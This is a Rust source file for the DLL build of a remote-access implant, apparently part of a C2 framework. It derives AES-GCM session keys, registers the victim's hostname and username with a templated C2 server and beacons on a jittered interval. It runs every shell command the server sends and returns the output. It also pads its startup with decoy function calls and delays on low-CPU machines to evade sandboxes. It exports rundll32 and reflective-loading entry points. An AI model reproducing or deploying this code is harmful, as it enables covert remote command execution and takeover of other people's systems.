// DLL entry point for rundll32 / reflective-load scenarios
// Calls the same agent loop as the EXE variant.
mod ghost;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use aes_gcm::aead::Aead;
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;
use std::thread;

type HmacSha256 = Hmac<Sha256>;

static mut C2S_KEY: [u8; 32] = [0u8; 32];
static mut S2C_KEY: [u8; 32] = [0u8; 32];

const EP: &str = "{{C2_HOST}}";
const PT: &str = "{{C2_PORT}}";
const SC: &str = "{{C2_SCHEME}}";
const AK: &str = "{{ENCRYPTION_KEY}}";
const SI: u64 = {{BEACON_INTERVAL}};
const SJ: u64 = {{BEACON_JITTER}};
const P1: &str = "{{REGISTER_URI}}";
const P2: &str = "{{CHECKIN_URI}}";
const P3: &str = "{{RESULT_URI}}";
const UA: &str = "{{USER_AGENT}}";

fn hkdf_derive(ikm: &[u8], salt: &[u8], info: &[u8]) -> [u8; 32] {
    let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).unwrap();
    mac.update(ikm);
    let prk = mac.finalize().into_bytes();
    let mut mac = <HmacSha256 as Mac>::new_from_slice(&prk).unwrap();
    mac.update(info);
    mac.update(&[1u8]);
    let okm = mac.finalize().into_bytes();
    let mut key = [0u8; 32];
    key.copy_from_slice(&okm);
    key
}

fn derive_session_keys(secret: &[u8], agent_id: &str) {
    let salt: &[u8] = if agent_id.is_empty() {
        b"sockpuppets-bootstrap"
    } else {
        agent_id.as_bytes()
    };
    unsafe {
        C2S_KEY = hkdf_derive(secret, salt, b"sockpuppets-c2s");
        S2C_KEY = hkdf_derive(secret, salt, b"sockpuppets-s2c");
    }
}

fn enc(pt: &str) -> String {
    let key = unsafe { C2S_KEY };
    let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
    let mut nonce_bytes = [0u8; 12];
    getrandom(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct_with_tag = cipher.encrypt(nonce, pt.as_bytes()).unwrap();
    let ct_len = ct_with_tag.len() - 16;
    let ciphertext = &ct_with_tag[..ct_len];
    let tag = &ct_with_tag[ct_len..];
    let mut result = Vec::with_capacity(12 + 16 + ct_len);
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(tag);
    result.extend_from_slice(ciphertext);
    B64.encode(&result)
}

fn dec(encoded: &str) -> Option<String> {
    let raw = B64.decode(encoded.trim()).ok()?;
    if raw.len() < 28 { return None; }
    let key = unsafe { S2C_KEY };
    let cipher = Aes256Gcm::new_from_slice(&key).ok()?;
    let nonce = Nonce::from_slice(&raw[..12]);
    let tag = &raw[12..28];
    let ciphertext = &raw[28..];
    let mut ct_with_tag = Vec::with_capacity(ciphertext.len() + 16);
    ct_with_tag.extend_from_slice(ciphertext);
    ct_with_tag.extend_from_slice(tag);
    let pt = cipher.decrypt(nonce, ct_with_tag.as_slice()).ok()?;
    String::from_utf8(pt).ok()
}

fn getrandom(buf: &mut [u8]) {
    use rand::RngCore;
    rand::thread_rng().fill_bytes(buf);
}

fn hn() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("COMPUTERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().into()).unwrap_or_default() }
}

fn un() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("USERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("USER").unwrap_or_default() }
}

fn ex(c: &str) -> String {
    if c.starts_with("cd ") {
        return match std::env::set_current_dir(c[3..].trim()) {
            Ok(_) => format!("Changed directory to {}", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default()),
            Err(e) => format!("Error: {}", e),
        };
    }
    #[cfg(target_os = "windows")]
    let o = Command::new("cmd").args(&["/C", c]).output();
    #[cfg(not(target_os = "windows"))]
    let o = Command::new("sh").args(&["-c", c]).output();
    match o {
        Ok(r) => {
            let s = format!("{}{}", String::from_utf8_lossy(&r.stdout), String::from_utf8_lossy(&r.stderr));
            if s.is_empty() { "OK".into() } else { s }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn hp(p: &str, b: &str) -> Option<String> {
    let a = format!("{}:{}", EP, PT);
    let mut s = TcpStream::connect_timeout(&a.parse().ok()?, Duration::from_secs(30)).ok()?;
    s.set_read_timeout(Some(Duration::from_secs(60))).ok();
    let r = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        p, a, UA, b.len(), b
    );
    s.write_all(r.as_bytes()).ok()?;
    let mut resp = String::new();
    s.read_to_string(&mut resp).ok()?;
    resp.find("\r\n\r\n").map(|i| resp[i+4..].to_string())
}

/// The agent main loop — shared between EXE (main) and DLL entry points.
fn agent_main() {
    let _ = ghost::health_check();
    let _ = ghost::collect_system_info();
    let _ = ghost::aggregate_metrics(&[1.0, 2.0, 3.0]);
    let _ = ghost::normalize_text("test");
    let _ = ghost::format_bytes(1024);
    let _ = ghost::timestamp();
    let _ = ghost::glob_match("*.txt", "test.txt");
    let _ = ghost::json_object(&[("status", "ok")]);
    let _ = ghost::validate_email("test@example.com");
    let _ = ghost::slugify("Hello World Test");
    let _ = ghost::base64_encode_simple(b"test data");
    let _ = ghost::sha256_simple(b"fingerprint");
    let _ = ghost::sha256_hash(b"test");
    let _ = ghost::parse_url("https://example.com/test");
    let _ = ghost::regex_match(r"\d+", "123");
    let _ = ghost::current_timestamp();
    let _ = ghost::create_status_report();
    let _ = ghost::parse_csv("a,b,c\n1,2,3");

    if std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1) < 2 {
        thread::sleep(Duration::from_secs(30));
    }

    let meta = json!({
        "hostname": hn(),
        "username": un(),
        "os": std::env::consts::OS,
        "architecture": std::env::consts::ARCH,
        "mode": "beacon",
        "beacon_interval": SI
    });
    let reg = json!({"type": "register", "metadata": meta});

    derive_session_keys(AK.as_bytes(), "");

    let mut aid = String::new();
    for _ in 0..10 {
        if let Some(r) = hp(P1, &enc(&reg.to_string())) {
            if let Some(d) = dec(&r) {
                if let Ok(v) = serde_json::from_str::<Value>(&d) {
                    if let Some(id) = v["agent_id"].as_str() {
                        aid = id.to_string();
                        break;
                    }
                }
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
    if aid.is_empty() { return; }

    derive_session_keys(AK.as_bytes(), &aid);

    let mut pending: Vec<Value> = Vec::new();
    let mut interval = SI;
    loop {
        let ci = json!({
            "type": "checkin",
            "agent_id": aid,
            "metadata": {"mode": "beacon"},
            "results": pending
        });
        pending.clear();

        if let Some(r) = hp(P2, &enc(&ci.to_string())) {
            if let Some(d) = dec(&r) {
                if let Ok(v) = serde_json::from_str::<Value>(&d) {
                    if let Some(cmds) = v["commands"].as_array() {
                        for c in cmds {
                            if let Some(cmd) = c["command"].as_str() {
                                if cmd == "__kill" { std::process::exit(0); }
                                if cmd.starts_with("__set_interval:") {
                                    if let Ok(n) = cmd[15..].parse::<u64>() {
                                        interval = n.max(1);
                                    }
                                    continue;
                                }
                                let out = ex(cmd);
                                pending.push(json!({
                                    "type": "response",
                                    "output": out,
                                    "command": cmd
                                }));
                            }
                        }
                    }
                }
            }
        }

        let base = interval;
        if SJ > 0 && SJ <= 100 {
            let jr = (base as f64) * (SJ as f64) / 100.0;
            let off = (rand::random::<f64>() * jr * 2.0) - jr;
            thread::sleep(Duration::from_secs(((base as f64 + off).max(1.0)) as u64));
        } else {
            thread::sleep(Duration::from_secs(base));
        }
    }
}

// ---- Windows DLL exports ----

#[cfg(target_os = "windows")]
mod dll {
    use super::agent_main;

    /// DllMain — called by the Windows loader on attach/detach.
    #[no_mangle]
    #[allow(non_snake_case)]
    pub extern "system" fn DllMain(
        _hinst: *mut std::ffi::c_void,
        reason: u32,
        _reserved: *mut std::ffi::c_void,
    ) -> i32 {
        const DLL_PROCESS_ATTACH: u32 = 1;
        if reason == DLL_PROCESS_ATTACH {
            // Spawn the agent on a new thread to avoid loader-lock deadlocks
            std::thread::spawn(|| agent_main());
        }
        1 // TRUE
    }

    /// rundll32-compatible export: rundll32 agent.dll,StartW
    #[no_mangle]
    #[allow(non_snake_case)]
    pub extern "system" fn StartW(
        _hwnd: *mut std::ffi::c_void,
        _hinst: *mut std::ffi::c_void,
        _cmd: *const u16,
        _show: i32,
    ) {
        agent_main();
    }

    /// Generic exported symbol for reflective loaders
    #[no_mangle]
    pub extern "C" fn Run() {
        agent_main();
    }
}

// ---- Non-Windows: simple exported entry point ----

#[cfg(not(target_os = "windows"))]
#[no_mangle]
pub extern "C" fn run() {
    agent_main();
}
